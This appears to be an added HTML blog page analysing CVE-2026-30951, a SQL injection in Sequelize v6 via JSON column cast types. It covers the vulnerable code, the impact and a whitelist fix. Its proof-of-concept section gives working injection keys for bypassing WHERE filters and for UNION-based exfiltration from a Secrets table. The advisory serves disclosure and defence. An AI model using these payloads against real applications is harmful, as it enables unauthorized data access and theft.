@@ -1,0 +1,362 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CVE-2026-30951: Sequelize v6 JSON SQL Injection — Digiserv.ID</title>
+  <meta name="description" content="Technical analysis of CVE-2026-30951: Sequelize v6 vulnerability to SQL Injection via JSON Column Cast Type.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700;900&family=DM+Sans:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0a0b0f;
+      --surface: #111318;
+      --surface2: #181c24;
+      --border: rgba(255, 255, 255, 0.07);
+      --accent: #c8a96e;
+      --text: #f0ede8;
+      --muted: #7a7d8a;
+      --dim: #3a3d4a;
+      --cursor-color: var(--accent);
+      --cursor-border: rgba(200, 169, 110, 0.4);
+      --cursor-blend: difference;
+    }
+
+    body.theme-simple {
+      --bg: #ffffff;
+      --surface: #f8f9fa;
+      --surface2: #e9ecef;
+      --border: rgba(0, 0, 0, 0.1);
+      --accent: #2563eb;
+      --text: #111827;
+      --muted: #6b7280;
+      --dim: #d1d5db;
+      --cursor-color: var(--accent);
+      --cursor-border: rgba(37, 99, 235, 0.4);
+      --cursor-blend: normal;
+    }
+
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'DM Sans', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      line-height: 1.6;
+      overflow-x: hidden;
+      cursor: none;
+    }
+
+    /* Custom cursor */
+    .cursor {
+      position: fixed;
+      width: 12px;
+      height: 12px;
+      background: var(--cursor-color);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 9999;
+      transform: translate(-50%, -50%);
+      transition: transform 0.1s ease;
+      mix-blend-mode: var(--cursor-blend);
+    }
+
+    .cursor-follower {
+      position: fixed;
+      width: 36px;
+      height: 36px;
+      border: 1px solid var(--cursor-border);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 9998;
+      transform: translate(-50%, -50%);
+      transition: all 0.15s ease;
+    }
+
+    nav {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 24px 60px;
+      background: linear-gradient(to bottom, rgba(10, 11, 15, 0.95) 0%, transparent 100%);
+      transition: all 0.3s ease;
+    }
+
+    body.theme-simple nav {
+      background: linear-gradient(to bottom, rgba(255, 255, 255, 0.95) 0%, transparent 100%);
+    }
+
+    .nav-logo {
+      font-family: 'Playfair Display', serif;
+      font-size: 20px;
+      font-weight: 700;
+      color: var(--text);
+      text-decoration: none;
+    }
+
+    .nav-logo span {
+      color: var(--accent);
+    }
+
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 160px 24px 80px;
+    }
+
+    .post-header {
+      margin-bottom: 60px;
+    }
+
+    .post-category {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.2em;
+      margin-bottom: 20px;
+      display: block;
+    }
+
+    .post-title {
+      font-family: 'Playfair Display', serif;
+      font-size: clamp(32px, 5vw, 56px);
+      line-height: 1.1;
+      margin-bottom: 24px;
+      font-weight: 900;
+    }
+
+    .post-meta {
+      font-size: 14px;
+      color: var(--muted);
+      display: flex;
+      gap: 20px;
+      align-items: center;
+    }
+
+    .content {
+      font-size: 18px;
+      color: var(--muted);
+    }
+
+    .content h2 {
+      font-family: 'Playfair Display', serif;
+      font-size: 32px;
+      color: var(--text);
+      margin: 48px 0 24px;
+    }
+
+    .content p {
+      margin-bottom: 24px;
+    }
+
+    .content strong {
+      color: var(--text);
+    }
+
+    pre {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      padding: 24px;
+      overflow-x: auto;
+      margin-bottom: 32px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 14px;
+      color: var(--text);
+    }
+
+    code {
+      font-family: 'JetBrains Mono', monospace;
+      background: var(--surface2);
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.9em;
+    }
+
+    pre code {
+      background: none;
+      padding: 0;
+    }
+
+    .impact-box {
+      background: rgba(239, 68, 68, 0.05);
+      border-left: 4px solid #ef4444;
+      padding: 24px;
+      margin: 40px 0;
+    }
+
+    .impact-box h3 {
+      color: #ef4444;
+      margin-bottom: 12px;
+      font-size: 18px;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+    }
+
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 600;
+      margin-bottom: 40px;
+      transition: transform 0.2s;
+    }
+
+    .back-btn:hover {
+      transform: translateX(-5px);
+    }
+
+    @media (max-width: 768px) {
+      nav { padding: 20px 24px; }
+      .container { padding-top: 120px; }
+      .post-title { font-size: 32px; }
+      body { cursor: auto; }
+      .cursor, .cursor-follower { display: none; }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="cursor" id="cursor"></div>
+  <div class="cursor-follower" id="cursorFollower"></div>
+
+  <nav>
+    <a href="../index.html" class="nav-logo">Digiserv<span>.ID</span></a>
+  </nav>
+
+  <article class="container">
+    <a href="../index.html" class="back-btn">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <line x1="19" y1="12" x2="5" y2="12"></line>
+        <polyline points="12 19 5 12 12 5"></polyline>
+      </svg>
+      Back to Home
+    </a>
+
+    <header class="post-header">
+      <span class="post-category">Cybersecurity Analysis</span>
+      <h1 class="post-title">Sequelize v6 Vulnerable to SQL Injection via JSON Column Cast Type</h1>
+      <div class="post-meta">
+        <span>March 12, 2026</span>
+        <span>•</span>
+        <span>CVE-2026-30951</span>
+      </div>
+    </header>
+
+    <div class="content">
+      <p><strong>Summary:</strong> A critical SQL injection vulnerability has been identified in Sequelize v6, specifically concerning unescaped cast type processing within JSON/JSONB <code>where</code> clauses. The <code>_traverseJSON()</code> function fails to properly validate cast types, allowing attackers to inject arbitrary SQL commands.</p>
+
+      <h2>The Vulnerability</h2>
+      <p>The issue resides in <code>src/dialects/abstract/query-generator.js</code>. The <code>_traverseJSON()</code> function extracts a cast type from JSON keys using the <code>::</code> delimiter without any validation or escaping before it is interpolated into the final SQL query.</p>
+
+      <pre><code>// Affected code in query-generator.js (line 1892)
+_traverseJSON(items, baseKey, prop, item, path) {
+    let cast;
+    if (path[path.length - 1].includes("::")) {
+      const tmp = path[path.length - 1].split("::");
+      cast = tmp[1];       // attacker-controlled, no escaping
+      path[path.length - 1] = tmp[0];
+    }
+    // ...
+    items.push(this.whereItemQuery(this._castKey(pathKey, item, cast), { [Op.eq]: item }));
+}</code></pre>
+
+      <p>An attacker who controls JSON object keys can inject arbitrary SQL. For example, a key like <code>role::text) or 1=1--</code> would result in <code>CAST(... AS TEXT) OR 1=1--)</code>, effectively bypassing authentication or exfiltrating data.</p>
+
+      <div class="impact-box">
+        <h3>Impact Analysis</h3>
+        <p><strong>SQL Injection (CWE-89):</strong> Any application passing user-controlled objects as <code>where</code> clause values for JSON columns is vulnerable. Attackers can exfiltrate data via UNION-based or boolean-blind injection techniques.</p>
+        <p><strong>Affected Versions:</strong> v6.x through 6.37.7. <i>Note: v7 (@sequelize/core) is not affected.</i></p>
+      </div>
+
+      <h2>Proof of Concept</h2>
+      <p>Testing against a vulnerable Sequelize instance demonstrates how an attacker can bypass filters or perform cross-table exfiltration:</p>
+
+      <pre><code>// WHERE clause bypass PoC
+const r1 = await User.findAll({
+  where: { metadata: { 'role::text) or 1=1--': 'anything' } }
+});
+// Returns ALL rows: ['alice', 'bob', 'charlie']
+
+// UNION-based exfiltration
+const r2 = await User.findAll({
+  where: {
+    metadata: {
+      'role::text) and 0 union select id,key,value,null,null from Secrets--': 'x'
+    }
+  },
+  raw: true
+});</code></pre>
+
+      <h2>Recommended Fix</h2>
+      <p>The solution is to implement a whitelist for allowed SQL data types. Any cast type not present in the whitelist should be rejected immediately.</p>
+
+      <pre><code>const ALLOWED_CAST_TYPES = new Set([
+  'integer', 'text', 'real', 'numeric', 'boolean', 'date',
+  'timestamp', 'timestamptz', 'json', 'jsonb', 'float',
+  'double precision', 'bigint', 'smallint', 'varchar', 'char',
+]);
+
+if (cast && !ALLOWED_CAST_TYPES.has(cast.toLowerCase())) {
+  throw new Error(`Invalid cast type: ${cast}`);
+}</code></pre>
+
+      <h2>References</h2>
+      <ul>
+        <li><a href="https://github.com/advisories/GHSA-6457-6jrx-69cr" style="color:var(--accent)">GHSA-6457-6jrx-69cr</a></li>
+        <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-30951" style="color:var(--accent)">CVE-2026-30951</a></li>
+      </ul>
+    </div>
+  </article>
+
+  <script>
+    // Theme Handling (Sync with home)
+    const savedTheme = localStorage.getItem('digiserv-theme') || 'portfolio';
+    if (savedTheme === 'simple') document.body.classList.add('theme-simple');
+
+    // Custom cursor logic
+    const cursor = document.getElementById('cursor');
+    const follower = document.getElementById('cursorFollower');
+    let mx = 0, my = 0, fx = 0, fy = 0;
+
+    document.addEventListener('mousemove', (e) => {
+      mx = e.clientX; my = e.clientY;
+      cursor.style.left = mx + 'px';
+      cursor.style.top = my + 'px';
+    });
+
+    function animateCursor() {
+      fx += (mx - fx) * 0.12;
+      fy += (my - fy) * 0.12;
+      follower.style.left = fx + 'px';
+      follower.style.top = fy + 'px';
+      requestAnimationFrame(animateCursor);
+    }
+    animateCursor();
+
+    document.querySelectorAll('a, button').forEach(el => {
+      el.addEventListener('mouseenter', () => {
+        cursor.style.transform = 'translate(-50%,-50%) scale(2.5)';
+        follower.style.transform = 'translate(-50%,-50%) scale(1.5)';
+      });
+      el.addEventListener('mouseleave', () => {
+        cursor.style.transform = 'translate(-50%,-50%) scale(1)';
+        follower.style.transform = 'translate(-50%,-50%) scale(1)';
+      });
+    });
+  </script>
+</body>
+
+</html>
